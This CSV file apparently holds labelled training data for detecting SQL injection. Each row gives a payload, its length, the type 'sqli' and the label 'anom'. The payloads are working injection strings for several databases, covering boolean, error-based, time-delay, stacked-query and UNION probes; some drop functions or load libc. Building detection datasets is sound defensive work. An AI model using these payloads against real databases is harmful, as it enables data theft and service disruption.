"payload","length","attack_type","label"
"1 where 1153=1153 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--","108","sqli","anom"
"-5350)) or 9323=9323#","21","sqli","anom"
"1' in boolean mode) and 5725=5552#","34","sqli","anom"
"1) as duqb where 6495=6495;select (case when (5914=2314) then 5914 else 1/(select 0) end)--","91","sqli","anom"
"1"") and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""hbfr"" like ""hbfr","222","sqli","anom"
"1') and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('ejnt' like 'ejnt","127","sqli","anom"
"1) where 1096=1096;if(7899=7899) select 7899 else drop function zbbp--","70","sqli","anom"
"1) or 8421=(select count(*) from generate_series(1,5000000)) and (5215=5215","75","sqli","anom"
"1',(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (7823=7823) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))","182","sqli","anom"
"1"")) or 8421=(select count(*) from generate_series(1,5000000)) and ((""vhey""=""vhey","81","sqli","anom"
"1'||(select 'glyc' from dual where 4058=4058;(select * from (select(sleep(5)))srmq))||'","87","sqli","anom"
"-1305) or make_set(2298=5545,5545) and (6715=6715","49","sqli","anom"
"1';begin user_lock.sleep(5); end and 'huti' like 'huti","54","sqli","anom"
"1'))) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","104","sqli","anom"
"1""));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((""swec"" like ""swec","114","sqli","anom"
"1%' and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and '%'='","103","sqli","anom"
"1"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""rbqs""=""rbqs","118","sqli","anom"
"-7552 or 6872=6872","18","sqli","anom"
"-5438"") union all select 3170,3170--","36","sqli","anom"
"1"" or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""menm"" like ""menm","84","sqli","anom"
"-8486%'))) or 8571=8571--","25","sqli","anom"
"1)) as khvx where 7533=7533 union all select null,null,null,null,null,null,null,null--","86","sqli","anom"
"1"")));select pg_sleep(5) and (((""wqeb""=""wqeb","44","sqli","anom"
"-2872) where 8797=8797 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#","153","sqli","anom"
"1;select like('abcdefg',upper(hex(randomblob(500000000/2))))-- ygbf","67","sqli","anom"
"(select (chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3287=3287) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))","169","sqli","anom"
"-2216"") where 6692=6692 union all select 6692,6692,6692#","56","sqli","anom"
"-4135'))) union all select 4413,4413,4413#","42","sqli","anom"
"1%'))) union all select null,null--","35","sqli","anom"
"-6279') union all select 3026,3026,3026,3026,3026,3026,3026,3026--","66","sqli","anom"
"1) and 3824=benchmark(5000000,md5(0x76555642)) and (6786=6786","61","sqli","anom"
"-2291)) or 4067=5666#","21","sqli","anom"
"1"")) as xtlt where 9293=9293;select case when 7717=7717 then 1 else null end--","78","sqli","anom"
"1""));waitfor delay '0:0:5'--","28","sqli","anom"
"1') where 6672=6672 union all select null,null,null,null,null,null,null,null,null,null--","88","sqli","anom"
"1'||(select 'yhkt' from dual where 7105=7105 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x))||'","249","sqli","anom"
"1""))) union all select null,null,null,null,null,null,null--","59","sqli","anom"
"1' in boolean mode) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))#","176","sqli","anom"
"1"") procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (""smhd"" like ""smhd","116","sqli","anom"
"1%' or elt(5873=5873,sleep(5))#","31","sqli","anom"
"1' or 8466=benchmark(5000000,md5(0x694a4745)) and 'raru'='raru","62","sqli","anom"
"1'+(select 'kcix' where 1117=1117;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--","130","sqli","anom"
"-4785' or (8459=8459)*4906 and 'esfn'='esfn","43","sqli","anom"
"-1238') as lxur where 7075=7075 union all select 7075,7075,7075,7075,7075,7075,7075,7075,7075,7075#","99","sqli","anom"
"1'));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (('cgou' like 'cgou","110","sqli","anom"
"1))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (((4127=4127","223","sqli","anom"
"1"")) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((""kldp"" like ""kldp","134","sqli","anom"
"1%'));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#","114","sqli","anom"
"1')) as yyud where 4934=4934;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--","119","sqli","anom"
"-3130) union all select 1741,1741,1741,1741,1741,1741,1741,1741#","64","sqli","anom"
"-1368)) union all select 1310,1310,1310,1310,1310#","50","sqli","anom"
"1',(select * from generate_series(2636,2636,case when (2636=7071) then 1 else 0 end) limit 1)","93","sqli","anom"
"1%' and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and '%'='","184","sqli","anom"
"1%') or 8421=(select count(*) from generate_series(1,5000000)) and ('%'='","73","sqli","anom"
"1' in boolean mode) union all select null,null,null,null,null,null,null,null,null--","83","sqli","anom"
"-2722"") or 4907=8126#","21","sqli","anom"
"-3461"")) union all select 6342,6342,6342,6342,6342,6342#","56","sqli","anom"
"1 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))# odvp","210","sqli","anom"
"1');select (case when (4297=9086) then 4297 else 1/(select 0) end)--","68","sqli","anom"
"1) where 1559=1559 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--","111","sqli","anom"
"(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)","84","sqli","anom"
"-2364' or 6743=7578","19","sqli","anom"
"1"")) and 9800=8713","18","sqli","anom"
"1) as sdnd where 9472=9472;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--","110","sqli","anom"
"1"" where 3692=3692 union all select null,null--","47","sqli","anom"
"1"")) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--","80","sqli","anom"
"1,(select (case when (8382=8382) then 1 else 1/(select 0) end))","63","sqli","anom"
"1')) as gqzy where 2312=2312 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","126","sqli","anom"
"1' or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and 'zpyx'='zpyx","121","sqli","anom"
"1') and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ('zcey'='zcey","127","sqli","anom"
"-2314%')) union all select 4612,4612--","38","sqli","anom"
"1"")));select pg_sleep(5) and (((""nvuv"" like ""nvuv","49","sqli","anom"
"1) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)","152","sqli","anom"
"1') or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))","63","sqli","anom"
"1' and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'jjxn'='jjxn","158","sqli","anom"
"1') where 3636=3636 or 4240=(select 4240 from pg_sleep(5))--","60","sqli","anom"
"1') where 9221=9221 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--","177","sqli","anom"
"-6942') union all select 7280,7280,7280#","40","sqli","anom"
"1) as uuro where 6784=6784;if(7899=7899) select 7899 else drop function zbbp--","78","sqli","anom"
"-3362' where 6567=6567 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#","153","sqli","anom"
"1')));waitfor delay '0:0:5' and ((('hrta'='hrta","47","sqli","anom"
"-5026' or (8459=8459)*4906 and 'uavj' like 'uavj","48","sqli","anom"
"1'||(select 'uvbb' where 7795=7795 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))||'","178","sqli","anom"
"1'))) union all select null,null,null,null,null,null,null--","59","sqli","anom"
"1');select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--","94","sqli","anom"
"1"") where 1833=1833;select (case when (3344=8103) then 3344 else 1/(select 0) end)--","84","sqli","anom"
"1"" where 9804=9804 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","156","sqli","anom"
"1'||(select 'fraa' from dual where 9140=9140 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x))||'","250","sqli","anom"
"1'||(select 'alxi' where 3967=3967 and 2388=benchmark(5000000,md5(0x6d457153))#","79","sqli","anom"
"1'+(select 'xbyn' where 6881=6881;begin user_lock.sleep(5); end)+'","66","sqli","anom"
"1 where 8905=8905 and make_set(7654=1923,1923)--","48","sqli","anom"
"-3161') or 8501=1796","20","sqli","anom"
"-5534 or 1983=5721#","19","sqli","anom"
"1))) and 6358=6735","18","sqli","anom"
"1' in boolean mode) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--","95","sqli","anom"
"1)) as vrev where 4248=4248 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--","121","sqli","anom"
"1') where 8628=8628 union all select null,null,null--","53","sqli","anom"
"1'||(select 'ezse' from dual where 3821=3821;select count(*) from generate_series(1,5000000)--","94","sqli","anom"
"1' in boolean mode) and 2006=2006","33","sqli","anom"
"-1639)) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((3318=3318","218","sqli","anom"
"1')));select (case when (7980=3703) then 7980 else 7980*(select 7980 from information_schema.character_sets) end)#","114","sqli","anom"
"1) where 9860=9860 and 4443=4111--","34","sqli","anom"
"1"")) as vdbf where 7969=7969 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--","119","sqli","anom"
"-1603')) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (('abmo'='abmo","120","sqli","anom"
"-3822"")) as dftp where 2817=2817 union all select 2817,2817,2817,2817,2817,2817#","80","sqli","anom"
"1%'));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (('%'='","83","sqli","anom"
"1' where 7828=7828 or 4240=(select 4240 from pg_sleep(5))--","59","sqli","anom"
"1%'))) rlike sleep(5)#","22","sqli","anom"
"1 where 9361=9361 and 7478=9170--","33","sqli","anom"
"1%"")) union all select null,null,null,null,null,null,null#","58","sqli","anom"
"-3063%""))) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((""%""=""","254","sqli","anom"
"1"");select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (""snwx"" like ""snwx","112","sqli","anom"
"1'||(select 'eayf' where 5431=5431 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null))||'","146","sqli","anom"
"1"")) as krro where 1050=1050 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--","160","sqli","anom"
"1%')));call regexp_substring(repeat(right(char(3702),0),500000000),null) and ((('%'='","85","sqli","anom"
"1"")) as dvpb where 6673=6673;select * from generate_series(6730,6730,case when (6730=9431) then 1 else 0 end) limit 1--","119","sqli","anom"
"1') where 7658=7658 union all select null,null#","47","sqli","anom"
"-6597'+(select aewz where 4036=4036 union all select 4036,4036,4036,4036,4036,4036,4036--","89","sqli","anom"
"1"")) as uqem where 3521=3521;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--","125","sqli","anom"
"-3343'||(select 'ssvt' where 5179=5179 union all select 5179,5179,5179,5179,5179,5179,5179,5179--","97","sqli","anom"
"-4389'))) or (1139=3499)*3499 and ((('qoch'='qoch","49","sqli","anom"
"1%"" and sleep(5) and ""%""=""","26","sqli","anom"
"1') as bscn where 6907=6907;select (case when (1724=6528) then 1724 else cast(1 as int)/(select 0 from dual) end) from dual--","125","sqli","anom"
"1"") as hhxx where 3372=3372 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","169","sqli","anom"
"1' in boolean mode);begin user_lock.sleep(5); end#","50","sqli","anom"
"-6567')) union all select 3217#","31","sqli","anom"
"1"" where 8672=8672 union all select null,null#","46","sqli","anom"
"1)) or 8156=(select count(*) from generate_series(1,5000000))--","63","sqli","anom"
"1') and (select * from (select(sleep(5)))fzno)","46","sqli","anom"
"1%'))) or 8466=benchmark(5000000,md5(0x694a4745)) and ((('%'='","62","sqli","anom"
"1%';select sleep(5)#","20","sqli","anom"
"1'||(select 'irfn' where 8360=8360;select (case when (3855=3855) then 3855 else 1/(select 0) end)--","99","sqli","anom"
"1')) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('pydi' like 'pydi","224","sqli","anom"
"-2743 union all select 6757,6757,6757,6757,6757,6757--","54","sqli","anom"
"-4745"" or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ""nifq"" like ""nifq","121","sqli","anom"
"1)) or elt(5873=5873,sleep(5))#","31","sqli","anom"
"1'||(select 'bwqc' from dual where 6897=6897 and sleep(5)#","58","sqli","anom"
"1%')) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","104","sqli","anom"
"-9553"") as geih where 6453=6453 or 8453=8159--","46","sqli","anom"
"-5972"" or 8509=3448#","20","sqli","anom"
"1"")) as fmul where 7827=7827;waitfor delay '0:0:5'--","52","sqli","anom"
"-1015"")) union all select 6624,6624#","36","sqli","anom"
"-4215) where 5782=5782 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--","204","sqli","anom"
"1"";select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--","93","sqli","anom"
"1"" and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ""epxq"" like ""epxq","121","sqli","anom"
"1'+(select 'rqok' where 5074=5074 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))+'","235","sqli","anom"
"1 union all select null,null,null,null--","40","sqli","anom"
"1'+(select hrgu where 9587=9587;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5))+'","149","sqli","anom"
"1) where 9059=9059 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--","110","sqli","anom"
"1%' union all select null,null,null,null,null#","46","sqli","anom"
"1')));select sleep(5)#","22","sqli","anom"
"1"")) as dshc where 9911=9911 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","126","sqli","anom"
